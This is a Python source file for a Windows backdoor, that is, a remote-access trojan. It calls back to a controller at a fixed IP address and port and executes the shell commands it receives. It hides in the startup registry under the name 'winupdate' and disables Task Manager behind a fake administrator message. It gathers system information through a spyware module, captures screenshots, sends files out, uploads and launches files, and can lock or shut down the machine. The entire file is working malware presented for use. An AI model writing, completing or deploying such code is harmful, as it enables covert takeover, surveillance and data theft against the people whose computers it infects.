import os
import sys
import time
import json
import socket
import ctypes
import base64
import spyware
import subprocess
from winreg import *
import filemanager as fm
from PIL import ImageGrab
from shutil import copyfile
 
class backdoor:
    PATH = os.path.realpath(sys.argv[0])
    TMP = os.environ["TEMP"]
    APPDATA = os.environ["APPDATA"]

    tm_enabled = True
    file_manager = fm.file_manager()

    def __init__(self, ip, port):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                break

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
        except Exception as e:
            return "[-] Unable to execute system command: {}, {}".format(command, e)

    def add_to_startup(self, on_startup):
        try:
            app_path = os.path.join(self.APPDATA, os.path.basename(self.PATH))
            if not os.getcwd() == self.APPDATA:
                copyfile(self.PATH, app_path)

            reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            SetValueEx(reg_key, "winupdate", 0, REG_SZ, app_path)
            CloseKey(reg_key)
        except WindowsError as e:
            if not on_startup:
                return "[-] Unable to add to startup: {}".format(e)
        else:
            if not on_startup:
                return "[+] Successfully added to startup."

    def remove_from_startup(self):
        try:
            reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            DeleteValue(reg_key, "winupdate")
            CloseKey(reg_key)
        except FileNotFoundError:
            return "[-] The program is not registered in startup."
        except WindowsError as e:
            return "[-] Error removing value: {}".format(e)
        else:
            return "[+] Successfully removed from startup."

    def show_message_box_popup(self, message):
        try:
            str_script = os.path.join(self.TMP, "m.vbs")

            with open(str_script, "w") as objVBS:
                objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
            subprocess.Popen(["cscript", str_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            return "[+] Send the victim the following message: {}".format(message)
        except Exception as e:
            return "[-] Couldn't send the message: {}, {}".format(message, e)

    def vbs_block_process(self, process, popup=False):
        strVBSCode = "On Error Resume Next\n" + \
                    "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
                    "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
                    "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                    "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
                    "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
                    f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
                    "objLatestProcess.TargetInstance.Terminate\n"
        if popup:
            strVBSCode += f'objWshShl.Popup "{popup[0]}", {popup[2]}, "{popup[1]}", {popup[3]}\n'

        strVBSCode += "End If\nLoop"
        strScript = os.path.join(self.TMP, "d.vbs")

        with open(strScript, "w") as objVBSFile:
            objVBSFile.write(strVBSCode)

        subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                        shell=True)

    def change_tm_state(self):
        global tm_enabled

        try:
            if not self.tm_enabled:
                subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE, shell=True)
            
                self.tm_enabled = True
                return "[+] Task Manager Enabled."
            else:
                popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]

                self.vbs_block_process("taskmgr.exe", popup=popup)
                self.tm_enabled = False
                return "[+] Task Manager Disabled."
        except Exception as e:
            return "[-] Couldn't change the State of the Task Manager: {}".format(e)

    def get_system_information(self):
        try:
            spw = spyware.spyware()
            return spw.report()
        except Exception as e:
            return "[-] Could'nt get System Information: {}".format(e)

    def lock_system(self):
        try:
            ctypes.windll.user32.LockWorkStation()
            return "[-] Successfully locked the system."
        except Exception as e:
            return "[-] Couldn't lock the system: {}".format(e)

    def shutdown_system(self, shutdown_type):
        try:
            command = f"shutdown {shutdown_type} -f -t 30"
            subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            
            self.connection.close()
            sys.exit(0)
        except Exception as e:
            return "[-] Couldn't shut down the system: {}".format(e)

    def get_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            path = self.APPDATA + "\SavedScreenshot.png"

            screenshot.save(path)
            data = self.read_file(path)

            self.file_manager.delete_file(path)
            return data
        except Exception as e:
            return "[-] Error getting screenshot data: {}".format(e)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to: {}".format(os.getcwd())

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run(self):
        while True:
            command = self.reliable_receive()
            command_0 = str(command[0]).lower()

            rest_of_sentence = " ".join(command[1:])
            try:
                if len(rest_of_sentence) == 0:
                    if command_0 == "e" or command_0 == "exit":
                        self.connection.close()
                        exit()
                    elif command_0 == "si":
                        command_result = self.get_system_information()
                    elif command_0 == "tm":
                        command_result = self.change_tm_state()                        
                    elif command_0 == "st":
                        command_result = self.add_to_startup(False)
                    elif command_0 == "rst":
                        command_result = self.remove_from_startup()
                    elif command_0 == "s":
                        command_result = self.get_screenshot()
                    elif command_0 == "q":
                        command_result = self.file_manager.play_sound("", True)
                    else:
                        command_result = self.execute_system_command(command)
                else:
                    if command_0 == "cd":
                        command_result = self.change_working_directory_to(rest_of_sentence)
                    elif command_0 == "d":
                        command_result = self.read_file(rest_of_sentence)
                    elif command_0 == "u":
                        command_as_list = rest_of_sentence.split(" ")             
                        data = command_as_list[-1]

                        command_result = self.write_file(self.APPDATA + "\\", data)
                    elif command_0 == "r":
                        command_result = self.file_manager.read_content_of_file(rest_of_sentence)
                    elif command_0 == "ps":
                        command_result = self.file_manager.play_sound(rest_of_sentence, False)
                    elif command_0 == "del":
                        command_result = self.file_manager.delete_file(rest_of_sentence)
                    elif command_0 == "exc":
                        command_0 = self.file_manager.launch_file(rest_of_sentence)
                    elif (command_0 == "cs" or command_0 == "changestate") and rest_of_sentence == "1":
                        command_result = self.lock_system()
                    elif (command_0 == "cs" or command_0 == "changestate") and rest_of_sentence == "2":
                        command_result = self.shutdown_system("-s")
                    elif (command_0 == "cs" or command_0 == "changestate") and rest_of_sentence == "3":
                        command_result = self.shutdown_system("-r")
                    elif command_0 == "sm":
                        command_result = self.show_message_box_popup(rest_of_sentence)
            except Exception as e:
                command_result = "[-] Error during command execution: {}".format(e)
 
            self.reliable_send(command_result)

my_backdoor = backdoor("192.168.1.107", 4444)
my_backdoor.run()